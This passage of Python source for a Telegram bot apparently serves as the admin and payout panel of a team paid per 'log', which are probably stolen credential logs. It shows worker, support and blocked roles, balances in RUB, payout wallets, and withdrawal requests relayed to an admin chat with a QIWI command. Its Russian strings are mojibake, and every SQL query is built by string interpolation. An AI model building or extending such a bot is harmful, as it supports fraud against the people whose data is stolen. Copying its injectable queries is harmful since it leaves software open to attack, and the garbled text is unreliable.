			alllogs = sql.fetchall()
			sql.execute(f"SELECT status FROM users WHERE id='{call.message.chat.id}'")
			st = sql.fetchall()[0][0]
			if st == 0:
				statusprofile = '–í–æ—Ä–∫–µ—Ä'
			elif st == 1:
				statusprofile = '–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä'
			elif st == 2:
				statusprofile = '–°–∞–ø–ø–æ—Ä—Ç'
			elif st == 3:
				statusprofile = '–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω'
			bot.send_message(call.message.chat.id,'üëÆ‚Äç‚ôÇÔ∏è –° –≤–æ–∑–≤—Ä–∞—â–µ–Ω–∏–µ–º, *'+str(fnameprofile[0][0])+'* \n\n*üßë‚Äçüíª –ü—Ä–æ—Ñ–∏–ª—å*\n\nüìå –í–∞—à —Ç—ç–≥: #'+str(tagprofile[0][0])+'\nüíæ –õ–æ–≥–∏–Ω –≤ –ë–î: *@'+str(profilelogin[0][0])+'*\nüìâ –°—Ç–∞–≤–∫–∞ –∑–∞ –ª–æ–≥: *'+str(config.price)+' RUB*\n\nüí∏ –ë–∞–ª–∞–Ω—Å: *'+str(balanceprofile[0][0])+' RUB*\nüìä –í—Å–µ–≥–æ –∑–∞—Ä–∞–±–æ—Ç–∞–Ω–Ω–æ: *'+str(allprofiteprofile[0][0])+' RUB*\nüíâ –í—Å–µ–≥–æ –ª–æ–≥–æ–≤: *'+str(alllogs[0][0])+'*\nüí∞ –ö–æ—à–µ–ª–µ–∫ –¥–ª—è –≤—ã–ø–ª–∞—Ç: *'+str(paymentprofile[0][0])+'*\n\nüë§ –°—Ç–∞—Ç—É—Å: *'+statusprofile+'*\nüìÜ –¢—ã —Å –Ω–∞–º–∏ —Å: *'+str(dateregprofile[0][0])+'*', parse_mode='Markdown', reply_markup=buttoninline)
		except:
				pass
	if call.data == 'delinfo':
		bot.delete_message(call.message.chat.id, call.message.message_id)
		bot.send_message(call.message.chat.id,'<b>‚ö†Ô∏è –í—ã —É–≤–µ—Ä–µ–Ω—ã? ‚ö†Ô∏è</b>\n–£–¥–∞–ª–∏—Ç—Å—è: <b>–í—Å–µ–≥–æ –∑–∞—Ä–∞–±–æ—Ç–∞–Ω–Ω–æ, –í—Å–µ–≥–æ –ª–æ–≥–æ–≤.</b>', parse_mode='HTML', reply_markup=buttoninline_del)
	if call.data == 'agreedel':
		bot.delete_message(call.message.chat.id, call.message.message_id)
		sql.execute(f"UPDATE users SET allprofit=0 WHERE id='{call.message.chat.id}'")
		sql.execute(f"UPDATE users SET alllogs=0 WHERE id='{call.message.chat.id}'")
		db.commit()
		bot.send_message(call.message.chat.id,'üéâ')
		try:
			sql.execute(f"SELECT login FROM users WHERE id='{call.message.chat.id}'")
			profilelogin = sql.fetchall()
			sql.execute(f"SELECT tag FROM users WHERE id='{call.message.chat.id}'")
			tagprofile = sql.fetchall()
			sql.execute(f"SELECT balance FROM users WHERE id='{call.message.chat.id}'")
			balanceprofile = sql.fetchall()
			sql.execute(f"SELECT allprofit FROM users WHERE id='{call.message.chat.id}'")
			allprofiteprofile = sql.fetchall()
			sql.execute(f"SELECT datereg FROM users WHERE id='{call.message.chat.id}'")
			dateregprofile = sql.fetchall()
			sql.execute(f"SELECT fname FROM users WHERE id='{call.message.chat.id}'")
			fnameprofile = sql.fetchall()
			sql.execute(f"SELECT payment FROM users WHERE id='{call.message.chat.id}'")
			paymentprofile = sql.fetchall()
			sql.execute(f"SELECT alllogs FROM users WHERE id='{call.message.chat.id}'")
			alllogs = sql.fetchall()
			sql.execute(f"SELECT status FROM users WHERE id='{call.message.chat.id}'")
			st = sql.fetchall()[0][0]
			if st == 0:
				statusprofile = '–í–æ—Ä–∫–µ—Ä'
			elif st == 1:
				statusprofile = '–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä'
			elif st == 2:
				statusprofile = '–°–∞–ø–ø–æ—Ä—Ç'
			elif st == 3:
				statusprofile = '–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω'
			bot.send_message(call.message.chat.id,'üëÆ‚Äç‚ôÇÔ∏è –° –≤–æ–∑–≤—Ä–∞—â–µ–Ω–∏–µ–º, *'+str(fnameprofile[0][0])+'* \n\n*üßë‚Äçüíª –ü—Ä–æ—Ñ–∏–ª—å*\n\nüìå –í–∞—à —Ç—ç–≥: #'+str(tagprofile[0][0])+'\nüíæ –õ–æ–≥–∏–Ω –≤ –ë–î: *@'+str(profilelogin[0][0])+'*\nüìâ –°—Ç–∞–≤–∫–∞ –∑–∞ –ª–æ–≥: *'+str(config.price)+' RUB*\n\nüí∏ –ë–∞–ª–∞–Ω—Å: *'+str(balanceprofile[0][0])+' RUB*\nüìä –í—Å–µ–≥–æ –∑–∞—Ä–∞–±–æ—Ç–∞–Ω–Ω–æ: *'+str(allprofiteprofile[0][0])+' RUB*\nüíâ –í—Å–µ–≥–æ –ª–æ–≥–æ–≤: *'+str(alllogs[0][0])+'*\nüí∞ –ö–æ—à–µ–ª–µ–∫ –¥–ª—è –≤—ã–ø–ª–∞—Ç: *'+str(paymentprofile[0][0])+'*\n\nüë§ –°—Ç–∞—Ç—É—Å: *'+statusprofile+'*\nüìÜ –¢—ã —Å –Ω–∞–º–∏ —Å: *'+str(dateregprofile[0][0])+'*', parse_mode='Markdown', reply_markup=buttoninline)
		except:
			pass
	if call.data == 'rules':
		bot.delete_message(call.message.chat.id, call.message.message_id)
		bot.send_message(call.message.chat.id,config.rulestext, parse_mode='HTML')
	if call.data == 'changetag':
		bot.delete_message(call.message.chat.id, call.message.message_id)
		a = bot.send_message(call.message.chat.id,'*–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–æ–≤—ã–π –¢—ç–≥ üëá*', parse_mode='Markdown')
		bot.register_next_step_handler(a, changetagdef)
	if call.data == 'withd':
		sql.execute(f"SELECT status FROM users WHERE id='{call.message.chat.id}'")
		st = sql.fetchall()[0][0]
		if st == 3:
			bot.send_message(call.message.chat.id,'‚ö†Ô∏è <b>–í—ã–≤–æ–¥ –∑–∞–ø—Ä–µ—â—ë–Ω!</b> ‚ö†Ô∏è', parse_mode='HTML')
			pass
		else:
			sql.execute(f"SELECT balance FROM users WHERE id='{call.message.chat.id}'")
			balik = sql.fetchall()
			sql.execute(f"SELECT payment FROM users WHERE id='{call.message.chat.id}'")
			payment = sql.fetchall()[0][0]
			if balik[0][0] < config.minwith:
				bot.send_message(call.message.chat.id,'‚ÄºÔ∏è –í—ã–≤–æ–¥ –Ω–µ –≤–æ–∑–º–æ–∂–µ–Ω. –ù–∞ –±–∞–ª–∞–Ω—Å–µ –º–µ–Ω—å—à–µ –º–∏–Ω–∏–º–∞–ª—å–Ω–æ–π —Å—É–º–º—ã –≤—ã–≤–æ–¥–∞. –í—ã–≤–æ–¥ –æ—Ç *'+str(config.minwith)+' RUB* ‚ÄºÔ∏è', parse_mode='Markdown')
				return
			if payment == '–¢—É—Ç –Ω–∏—á–µ–≥–æ –Ω–µ—Ç :(':
				bot.send_message(call.message.chat.id,'‚ÄºÔ∏è –í—ã–≤–æ–¥ –Ω–µ –≤–æ–∑–º–æ–∂–µ–Ω. –ù–µ —É–∫–∞–∑–∞–Ω —Å–ø–æ—Å–æ–± –≤—ã–≤–æ–¥–∞ ‚ÄºÔ∏è', parse_mode='Markdown')
				return
			else:
				sql.execute(f"SELECT balance FROM users WHERE id='{call.message.chat.id}'")
				balanceworker = sql.fetchall()
				sql.execute(f"UPDATE users SET balance=balance-balance WHERE id='{call.message.chat.id}'")
				db.commit()
				sql.execute(f"SELECT payment FROM users WHERE id='{call.message.chat.id}'")
				paymentprofile = sql.fetchall()
				bot.send_message(call.message.chat.id,'‚úÖ –ó–∞—è–≤–∫–∞ –Ω–∞ –≤—ã–≤–æ–¥ *'+str(balanceworker[0][0])+' RUB* —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞!\nüí∞ –ö–æ—à–µ–ª–µ–∫ –¥–ª—è –≤—ã–ø–ª–∞—Ç: *'+str(paymentprofile[0][0])+'*', parse_mode='Markdown')
				sql.execute(f"SELECT tag FROM users WHERE id='{call.message.chat.id}'")
				tagprofile = sql.fetchall()
				sql.execute(f"SELECT tag FROM users WHERE id='{call.message.chat.id}'")
				tagworker = sql.fetchall()
				bot.send_message(config.amschatid, '–≠–π, —Ö–≤–∞—Ç–∏—Ç –∫—É—Ä–∏—Ç—å üö¨\n–°–æ–∑–¥–∞–Ω–∞ –∑–∞—è–≤–∫–∞ –Ω–∞ –≤—ã–≤–æ–¥\n\nüßë‚Äçüíª –í–æ—Ä–∫–µ—Ä: #'+str(tagworker[0][0])+'\nüÜî ID: <b>'+str(call.message.chat.id)+'</b>\nüìä –°—É–º–º–∞ –≤—ã–ø–ª–∞—Ç—ã: <b>'+str(balanceworker[0][0])+' RUB</b>\nüí∞ –ö–æ—à–µ–ª–µ–∫ –¥–ª—è –≤—ã–ª–∞—Ç—ã: <b>'+str(paymentprofile[0][0])+'</b>\n\n/qiwisendmoney '+str(paymentprofile[0][0])+':'+str(balanceworker[0][0])+'', parse_mode='HTML')
				bot.send_message(config.profitlinkid, 'üíû –ó–∞—è–≤–∫–∞ –Ω–∞ –≤—ã–≤–æ–¥\nüí∏ –°—É–º–º–∞ –∑–∞—è–≤–∫–∏: <b>'+str(balanceworker[0][0])+' RUB</b>\n\nüßë‚Äçüíª –í–æ—Ä–∫–µ—Ä: #'+str(tagworker[0][0])+'\n‚öôÔ∏è –°—Ç–∞—Ç—É—Å: –í–´–ü–õ–ê–ß–ï–ù–û', parse_mode='HTML')
	if call.data == 'changepayment':
		bot.delete_message(call.message.chat.id, call.message.message_id)
		a = bot.send_message(call.message.chat.id,'*–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∫–æ—à–µ–ª—å–∫–∞ –¥–ª—è –≤—ã–ø–ª–∞—Ç—ã üëá*', parse_mode='Markdown')
		bot.register_next_step_handler(a, changepaymentdef)
if __name__ == '__main__':
	bot.polling(none_stop=True) 